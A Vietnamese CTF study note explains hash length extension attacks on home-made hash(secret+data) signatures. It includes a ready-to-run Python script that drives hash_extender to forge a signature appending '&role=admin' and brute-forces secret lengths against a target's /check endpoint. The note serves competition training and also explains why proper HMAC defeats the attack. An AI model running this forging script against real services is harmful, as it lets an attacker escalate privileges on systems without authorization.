# Hash Length Extension (nối thêm dữ liệu vào hash mà không cần biết secret)

Một số hàm hash (MD5, SHA1, SHA256) tính theo từng khối nối tiếp nhau, giống việc cộng dồn 1 dãy số: bạn chỉ cần biết "số dư hiện tại" là cộng thêm được số tiếp theo, không cần biết những số đã cộng trước đó là gì. Nếu web tự chế "chữ ký" bằng cách ghép `hash(secret + data)` (bí mật `secret` bạn không biết, nối với dữ liệu `data` bạn thấy công khai), thì cái hash bạn đang cầm trong tay chính là "số dư hiện tại" đó — bạn có thể tính tiếp ra 1 hash hợp lệ cho `data + (phần bạn tự thêm)` mà không cần biết `secret` là gì, chỉ cần đoán đúng **độ dài** của nó.

Trên Burp bạn nhận ra lỗi này khi: thấy request có 2 tham số đi cùng nhau, ví dụ `data=uid=1&role=user` và `sig=2c70e1...` (chuỗi hex 32/40/64 ký tự, không phải JWT — không có 2 dấu chấm, không phải dạng `eyJ...`). Đây là dấu hiệu web tự ghép hash kiểu trên.

## Cài trước ngày thi (không có Internet lúc thi)

Kỹ thuật này cần tool `hash_extender` để tự tính đúng phần "đệm" (padding) theo chuẩn — tự ghép tay rất dễ sai. Clone + build sẵn trước ngày thi:

```bash
# chạy 1 lần trước ngày thi, cần Internet
git clone --depth 1 https://github.com/iagox86/hash_extender.git ~/hoc/CTF/Tools/web/hash_extender
cd ~/hoc/CTF/Tools/web/hash_extender && make
```

## Snippet copy-là-chạy

```python
import re
import subprocess

import requests

base = "http://target"
s = requests.Session()
s.verify = False

HASH_EXTENDER_DIR = "/home/ld/hoc/CTF/Tools/web/hash_extender"
FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-fA-F]{64}\}")


def solve_one(session, base_url):
    # Bước 1: lấy 1 cặp (data, sig) hợp lệ bằng cách giải tay/đọc traffic thật trước
    # data PHẢI đúng NGUYÊN VĂN những gì server đã hash (copy chính xác từ request thật)
    orig_data = "uid=1&role=user"
    orig_sig = "2c70e12b7a0646f92279f427c7b38e7334d8e5389cff167a1dc30e73f826b683"  # 64 hex -> nghi SHA256
    append = "&role=admin"  # phần bạn muốn "nối thêm" vào cuối

    # Bước 2: chạy hash_extender, quét độ dài secret từ 0 đến 48
    # (không biết chính xác độ dài secret thật, nên phải thử nhiều giá trị)
    out = subprocess.run(
        [
            "./hash_extender",
            "--data", orig_data,
            "--secret-min", "0",
            "--secret-max", "48",
            "--append", append,
            "--signature", orig_sig,
            "--format", "sha256",
            "--out-data-format", "html",  # html = tự URL-encode sẵn, dán thẳng vào params
        ],
        cwd=HASH_EXTENDER_DIR,
        capture_output=True,
        text=True,
        timeout=30,
    )
    sigs = re.findall(r"New signature: (\w+)", out.stdout)
    datas = re.findall(r"New string: (\S+)", out.stdout)

    # Bước 3: thử GỬI TỪNG CẶP (data mới, sig mới) lên server, dừng ngay khi 1 cặp được chấp nhận
    for new_data, new_sig in zip(datas, sigs):
        try:
            r = session.get(
                f"{base_url}/check",
                params={"data": new_data, "sig": new_sig},
                timeout=5,
            )
        except requests.RequestException:
            continue
        if "invalid" in r.text.lower():
            continue  # cặp này sai độ dài secret, thử cặp tiếp theo
        m = FLAG_RE.search(r.text)
        if m:
            return m.group(0)
    return None


if __name__ == "__main__":
    print("Flag:", solve_one(s, base))
```

## Giải thích cho người mới

- **`--data`**: dữ liệu gốc, phải copy ĐÚNG TUYỆT ĐỐI từng ký tự (kể cả dấu `&`, khoảng trắng) từ request thật — vì hash_extender cần tính padding dựa trên đúng chuỗi mà server đã hash, sai 1 ký tự là ra toàn bộ kết quả sai.
- **`--secret-min`/`--secret-max`**: khoảng độ dài secret bạn thử. Bạn không biết secret là gì, nhưng chỉ cần đoán đúng **độ dài** (số byte), tool tự tính phần còn lại.
- **`--out-data-format html`**: bảo tool in ra data mới đã URL-encode sẵn, dán trực tiếp vào `params=` hoặc query string mà không cần tự encode lại.
- **Vì sao phải thử nhiều cặp**: mỗi độ dài secret trong khoảng min-max cho ra 1 cặp (data, sig) khác nhau, nhưng chỉ 1 trong số đó khớp với độ dài secret THẬT của server — script cứ gửi lần lượt, server tự báo "invalid" cho các cặp sai.
- Code `subprocess.run([...], cwd=..., capture_output=True, text=True)` chỉ là cách Python gọi 1 chương trình ngoài (ở đây là `./hash_extender`) và đọc lại output của nó như đọc text bình thường, xem `02_Chuoi_Request/05_Tinh_Toan_Cuc_Bo.md` mục 3 nếu chưa quen.

## Lưu ý nhanh

- Nếu mọi cặp đều bị từ chối: khả năng cao `--data` chưa khớp byte-by-byte với dữ liệu server thực sự đã hash, hoặc sai thuật toán (thử lại với `--format md5` hoặc `--format sha1` nếu độ dài hex nghi ngờ nhiều thuật toán).
- Độ dài secret THƯỜNG CỐ ĐỊNH trong code của toàn bộ các đội (vì cùng service) — sau khi tìm ra đúng độ dài ở 1 đội, nhớ lại giá trị đó để chạy nhanh hơn ở các đội khác (đặt `--secret-min` = `--secret-max` = độ dài đã biết).
- Bài này KHÔNG áp dụng nếu server dùng HMAC đúng chuẩn (`hmac.new(...)`) hoặc dùng SHA3 — xem lại cách nhận diện ở đầu file.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
